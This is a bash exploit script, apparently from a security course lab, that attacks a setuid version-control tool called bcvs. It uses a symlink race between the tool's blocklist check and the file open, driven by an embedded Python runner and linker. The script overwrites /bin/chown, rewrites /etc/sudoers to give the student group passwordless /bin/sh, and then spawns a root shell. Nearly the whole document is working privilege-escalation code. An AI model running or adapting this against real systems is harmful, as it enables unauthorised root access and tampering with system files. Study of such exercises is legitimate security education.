#!/bin/bash

## --------------------------- Sploit Description ---------------------------- ##
#  This sploit takes advantage of a TOCTOU vulnerability in bcvs between the
#  is_blocked function call and when the file is actually opened. See
#  sploit5.txt for more information.
## --------------------------------------------------------------------------- ##

REPODIR=".bcvs"
BLOCKLIST="block.list"
BLOCKLISTPATH="${REPODIR}/${BLOCKLIST}"

rm -rf sploit5_dir
mkdir -p sploit5_dir
cd sploit5_dir
mkdir -p ${REPODIR}
touch ${BLOCKLISTPATH}

#blocklist - Exact copy of the one in bcvs's directory
echo $REPODIR > $BLOCKLISTPATH
echo "/etc/" >> $BLOCKLISTPATH
echo "/etc/shadow" >> $BLOCKLISTPATH
echo "/sbin/" >> $BLOCKLISTPATH


TARGET_FILE="/etc/test_overwrite"
LOCAL_FILE="my_file"
LOCAL_FILE_REPO="${REPODIR}/${LOCAL_FILE}"

# Create LOCAL_FILE in repodir for checkout
touch $LOCAL_FILE_REPO
echo "My version of the file" > ${LOCAL_FILE_REPO}


rm -f run_bcvs.py
cat <<EOS > "run_bcvs.py"
#!/usr/bin/python
import os, sys
import time
import signal
import subprocess as sub

bcvs_exe="/opt/bcvs/bcvs"
target_file="$TARGET_FILE"
local_file="$LOCAL_FILE"
repo_dir="$REPODIR"
exit = False

def handler(signum, frame):
  print("Received signal")
  exit = True

def run_bcvs(opcode):
  call_args = [bcvs_exe, opcode, local_file]
  try:
    process = sub.Popen(call_args, stdin=sub.PIPE, stdout=sub.PIPE)
    output = process.communicate("junk")
  except ValueError as ve:
    print("bcvs called with invalid arguments")
    print("\tException: {}".format(ve))
  except OSError as ose:
    print("OSError Exception: {}".format(ose))
  except Exception as e:
    print("Unexpected exception while running bcvs: {}".format(e))

  return

def link_to_target():
  # This removes the actual 'local_file' file and creates a link
  # under the same name to the target file
  os.remove(local_file)
  os.symlink(target_file, local_file)

def create_local():
  # Goes the opposite direction of link_to_target
  try:
    os.remove(local_file)
  except OSError as ose:
    if ose.errno != 2:
      print("create_local exception: {}".format(ose))
      return

  try:
    open(local_file, "w").close()
  except IOError as ioe:
    if ioe.errno == 13:
      print("The race condition likely succeeded. Exiting...")
      sys.exit(0)

def usage():
  print("Usage: {} <mode> [ci|co](only if using runner mode) [local_file] [target_file]".format(sys.argv[0]))

if __name__ == '__main__':
  if len(sys.argv) < 2:
    usage()
    sys.exit(1)

  signal.signal(signal.SIGINT, handler)

  if (sys.argv[1] == "runner"):
    print("Starting run_bcvs as runner")
    if len(sys.argv) < 3:
      usage()
      sys.exit(1)

    if len(sys.argv) > 3:
      local_file = sys.argv[3]

    print("Runner (local: {})".format(local_file))

    while not exit:
      # Just spam bcvs until the race condition hits
      print("Running bcvs")
      run_bcvs(sys.argv[2])

  elif (sys.argv[1] == "linker"):
    print("Starting run_bcvs as linker")
    if len(sys.argv) > 2:
      local_file = sys.argv[2]
    if len(sys.argv) > 3:
      target_file = sys.argv[3]

    print("Linker (local: {}, target: {})".format(local_file, target_file))
    while not exit:
      # Link and unlink the file we want to modify
      print("Removing file link")
      create_local()
      time.sleep(0.05)
      print("Linking to target")
      link_to_target()
      time.sleep(0.04)

      sz_target = os.stat(target_file).st_size
      sz_repo = os.stat("${REPODIR}/" + local_file).st_size
      if sz_target == sz_repo:
        print("Repo file and target file have same size. Exploit likely worked.")
        print("sz_target = {}, sz_repo = {}".format(sz_target, sz_repo))
        exit = True
        break

    sys.exit(0)
EOS
chmod +x run_bcvs.py

OFFSET=361
ATTACK_STR_BASE="noobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoob00"
ATTACK_STR_SUDO="${ATTACK_STR_BASE}0440"
ATTACK_STR_OTHER="${ATTACK_STR_BASE}0777"
echo "ATTACK_STR_BASE (length: ${#ATTACK_STR_BASE}): $ATTACK_STR_BASE"
echo "ATTACK_STR_SUDO (length: ${#ATTACK_STR_SUDO}): $ATTACK_STR_SUDO"
echo "ATTACK_STR_OTHER (length: ${#ATTACK_STR_OTHER}): $ATTACK_STR_OTHER"

# First we need to try and overwrite the chown executable
# Since /bin isn't in the block list we can do this easily
# Since we are nice attackers we will first backup the current one. Still
# need a root shell to copy it back
if [[ ! -f "~/chown.save" ]]; then
  cp /bin/chown ~/chown.save
fi

cat <<EOS > "${REPODIR}/my_chown"
#!/bin/bash
echo "Fake chown script"
EOS

ln -s /bin/chown my_chown

echo "Using bcvs to overwrite /bin/chown"
echo "comment" | /opt/bcvs/bcvs co my_chown

# ------------------------------------------------------------------
# Now to overwrite the sudoers file
# Since the sudoers file is in the block list path for /etc we need to
# exploit the race condition
LOCAL_FILE=$ATTACK_STR_SUDO
TARGET_FILE="/etc/sudoers"

cat <<EOS > "${REPODIR}/${LOCAL_FILE}"
Defaults env_reset
root ALL=(ALL:ALL) ALL
%admin ALL=(ALL) ALL
%sudo ALL=(ALL:ALL) ALL
%student ALL=NOPASSWD: /bin/sh
#includedir /etc/sudoers.d
EOS

touch ${LOCAL_FILE}

./run_bcvs.py runner co ${LOCAL_FILE} &
RUNNER_PID=$!

./run_bcvs.py linker ${LOCAL_FILE} "${TARGET_FILE}" &
LINKER_PID=$!

trap "echo \"Killing attack processes\"; kill -9 $RUNNER_PID; kill -9 $LINKER_PID; exit -1" SIGINT

wait $LINKER_PID
kill -9 $RUNNER_PID

sudo /bin/sh

echo "Now reset your chown binary and sudoers file."
